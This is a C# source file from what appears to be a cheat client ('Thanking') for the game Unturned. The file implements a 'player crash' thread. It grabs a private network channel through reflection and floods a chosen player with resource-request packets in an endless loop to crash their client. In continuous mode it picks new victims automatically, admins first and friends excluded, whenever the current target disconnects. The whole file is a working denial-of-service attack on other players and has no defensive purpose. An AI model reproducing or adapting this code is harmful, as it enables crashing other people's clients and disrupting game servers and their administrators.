﻿using System.Linq;
 using System.Reflection;
 using System.Threading;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
using Thanking.Utilities;
using UnityEngine;

namespace Thanking.Threads
{
    public static class PlayerCrashThread
    {
        public static bool PlayerCrashEnabled;
        public static bool ContinuousPlayerCrash;
        public static CSteamID CrashTarget;
        
        [Thread]
        public static void Start()
        {
            Thread.Sleep(5000);
            #if DEBUG
			DebugUtilities.Log("Player Crash Thread Started");
			#endif
            Provider.onEnemyDisconnected += OnDisconnect;

            ResourceManager instance = (ResourceManager) typeof(ResourceManager)
                .GetField("manager", BindingFlags.NonPublic | BindingFlags.Static).GetValue(null);
            
            instance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
                instance.channel.getCall("askResources"), out int size, out byte[] Packet, (byte)0, (byte)0);
            
            while (true)
            {
                if (PlayerCrashEnabled)
                    Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, Packet, size, instance.channel.id);
                
                else
                {
                    Thread.Sleep(1000);
                    if (!ContinuousPlayerCrash || Provider.clients.Count == 0)
                        continue;

                    PlayerCrashEnabled = true;
                    Thread.Sleep(1000);
                    
                    CrashTarget = Provider.clients.OrderBy(p => p.isAdmin ? 0 : 1)
                        .First(p => !FriendUtilities.IsFriendly(p.player)).playerID.steamID;
                }
            }
        }

        public static void OnDisconnect(SteamPlayer player)
        {
            if (player.playerID.steamID == CrashTarget)
            {
                if (!ContinuousPlayerCrash)
                    PlayerCrashEnabled = false;
                
                else
                    CrashTarget = Provider.clients.OrderBy(p => p.isAdmin ? 0 : 1)
                        .First(p => p.playerID.steamID != CrashTarget && !FriendUtilities.IsFriendly(p.player)).playerID.steamID;
            }
        }  
    }
}
